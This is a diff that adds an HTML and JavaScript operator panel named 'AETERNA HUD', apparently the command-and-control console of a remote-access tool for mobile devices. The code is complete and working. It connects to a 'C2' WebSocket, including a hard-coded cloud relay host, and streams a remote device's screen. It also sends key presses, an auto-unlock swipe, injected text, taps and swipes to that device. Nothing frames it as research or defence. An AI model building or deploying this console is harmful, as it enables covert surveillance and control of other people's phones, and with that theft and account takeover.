@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AETERNA HUD — Remote Node</title>
+    <style>
+        :root {
+            --bg: #050505;
+            --panel: #111;
+            --accent: #8b5cf6;
+            --text: #eee;
+            --border: #333;
+        }
+        body {
+            margin: 0;
+            padding: 0;
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .sidebar {
+            width: 300px;
+            background: var(--panel);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .header {
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+        }
+        .header h2 {
+            margin: 0;
+            font-size: 1rem;
+            color: var(--accent);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        .status {
+            font-size: 0.8rem;
+            color: #888;
+            margin-top: 5px;
+        }
+        .status span {
+            color: #10b981;
+            font-weight: bold;
+        }
+        .controls {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        button {
+            background: #222;
+            color: var(--text);
+            border: 1px solid var(--border);
+            padding: 10px;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: 0.2s;
+            text-transform: uppercase;
+            font-size: 0.8rem;
+            letter-spacing: 1px;
+        }
+        button:hover {
+            background: var(--accent);
+            border-color: var(--accent);
+        }
+        .text-input-group {
+            display: flex;
+            margin-top: 20px;
+            gap: 5px;
+        }
+        input {
+            flex: 1;
+            background: #000;
+            border: 1px solid var(--border);
+            color: #fff;
+            padding: 8px;
+            border-radius: 4px;
+        }
+        .main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #000;
+            position: relative;
+        }
+        #screen {
+            max-height: 95%;
+            max-width: 95%;
+            object-fit: contain;
+            border: 1px solid var(--border);
+            box-shadow: 0 0 20px rgba(139, 92, 246, 0.1);
+            cursor: crosshair;
+        }
+        .overlay {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.7);
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 0.8rem;
+            color: #0f0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="sidebar">
+        <div class="header">
+            <h2>AETERNA HUD</h2>
+            <div class="status">Node: <span id="node-id">Connecting...</span></div>
+            <div class="status">C2 Link: <span id="c2-status" style="color: #fbbf24;">PENDING</span></div>
+        </div>
+
+        <div class="controls">
+            <button onclick="sendCommand('key', {key: 'BACK'})">Back</button>
+            <button onclick="sendCommand('key', {key: 'HOME'})">Home</button>
+            <button onclick="sendCommand('key', {key: 'RECENTS'})">Recents</button>
+            <button onclick="sendCommand('key', {key: 'POWER'})">Lock/Power</button>
+            <button onclick="sendCommand('unlock', {pin: ''})">Auto-Unlock (Swipe)</button>
+        </div>
+
+        <div class="text-input-group">
+            <input type="text" id="text-input" placeholder="Inject text...">
+            <button onclick="sendText()">Send</button>
+        </div>
+    </div>
+
+    <div class="main">
+        <img id="screen" alt="Waiting for video stream..." />
+        <div class="overlay" id="ping">FPS: 0</div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = urlParams.get('device');
+        document.getElementById('node-id').innerText = deviceId || 'UNKNOWN';
+
+        if (!deviceId) {
+            alert('No device ID provided in URL.');
+        }
+
+        // Determine C2 WebSocket target: local host or cloud relay (aeterna-c2.onrender.com)
+        const hostWs = (window.location.protocol === 'https:' ? 'wss://' : 'ws://') + window.location.host;
+        const cloudWs = 'wss://aeterna-c2.onrender.com';
+        // If loaded on paas.website or local port without direct WS, allow fallback
+        const wsUrl = urlParams.get('hub') || (window.location.hostname.includes('paas.website') ? cloudWs : hostWs);
+        const ws = new WebSocket(wsUrl);
+
+        let frames = 0;
+        setInterval(() => {
+            document.getElementById('ping').innerText = `FPS: ${frames}`;
+            frames = 0;
+        }, 1000);
+
+        ws.onopen = () => {
+            document.getElementById('c2-status').innerText = 'CONNECTED';
+            document.getElementById('c2-status').style.color = '#10b981';
+            ws.send(JSON.stringify({
+                type: 'identify',
+                role: 'viewer',
+                deviceId: deviceId,
+                pass: urlParams.get('pass') || ''
+            }));
+        };
+
+        ws.onmessage = async (event) => {
+            if (event.data instanceof Blob) {
+                frames++;
+                const url = URL.createObjectURL(event.data);
+                const img = document.getElementById('screen');
+                if (img.src && img.src.startsWith('blob:')) {
+                    URL.revokeObjectURL(img.src);
+                }
+                img.src = url;
+            } else {
+                try {
+                    const text = typeof event.data === 'string' ? event.data : await event.data.text();
+                    const data = JSON.parse(text);
+                    if (data.frame) {
+                        frames++;
+                        document.getElementById('screen').src = 'data:image/jpeg;base64,' + data.frame;
+                    }
+                } catch (_) {}
+            }
+        };
+
+        ws.onclose = () => {
+            document.getElementById('c2-status').innerText = 'DISCONNECTED';
+            document.getElementById('c2-status').style.color = '#ef4444';
+        };
+
+        function sendCommand(action, data = {}) {
+            if (ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ action, ...data }));
+            }
+        }
+
+        function sendText() {
+            const val = document.getElementById('text-input').value;
+            if (val) {
+                sendCommand('text', { text: val });
+                document.getElementById('text-input').value = '';
+            }
+        }
+
+        // Screen Click Handling
+        const screenEl = document.getElementById('screen');
+        screenEl.addEventListener('click', (e) => {
+            const rect = screenEl.getBoundingClientRect();
+            // Calculate percentage coordinates relative to the image
+            const x = ((e.clientX - rect.left) / rect.width) * 100;
+            const y = ((e.clientY - rect.top) / rect.height) * 100;
+            
+            sendCommand('click', { x: x, y: y });
+            
+            // Visual feedback
+            const ripple = document.createElement('div');
+            ripple.style.position = 'absolute';
+            ripple.style.left = e.clientX + 'px';
+            ripple.style.top = e.clientY + 'px';
+            ripple.style.width = '20px';
+            ripple.style.height = '20px';
+            ripple.style.background = 'rgba(139, 92, 246, 0.5)';
+            ripple.style.borderRadius = '50%';
+            ripple.style.transform = 'translate(-50%, -50%)';
+            ripple.style.pointerEvents = 'none';
+            ripple.style.animation = 'ping 0.5s ease-out forwards';
+            document.body.appendChild(ripple);
+            
+            setTimeout(() => ripple.remove(), 500);
+        });
+
+        // Swipe Handling
+        let startX, startY;
+        screenEl.addEventListener('mousedown', (e) => {
+            startX = e.clientX;
+            startY = e.clientY;
+        });
+
+        screenEl.addEventListener('mouseup', (e) => {
+            const endX = e.clientX;
+            const endY = e.clientY;
+            
+            const dist = Math.hypot(endX - startX, endY - startY);
+            if (dist > 30) { // minimum distance for swipe
+                const rect = screenEl.getBoundingClientRect();
+                const x1 = ((startX - rect.left) / rect.width) * 100;
+                const y1 = ((startY - rect.top) / rect.height) * 100;
+                const x2 = ((endX - rect.left) / rect.width) * 100;
+                const y2 = ((endY - rect.top) / rect.height) * 100;
+                
+                sendCommand('swipe', { x1, y1, x2, y2 });
+            }
+        });
+    </script>
+    <style>
+        @keyframes ping {
+            0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+            100% { transform: translate(-50%, -50%) scale(3); opacity: 0; }
+        }
+    </style>
+</body>
+</html>
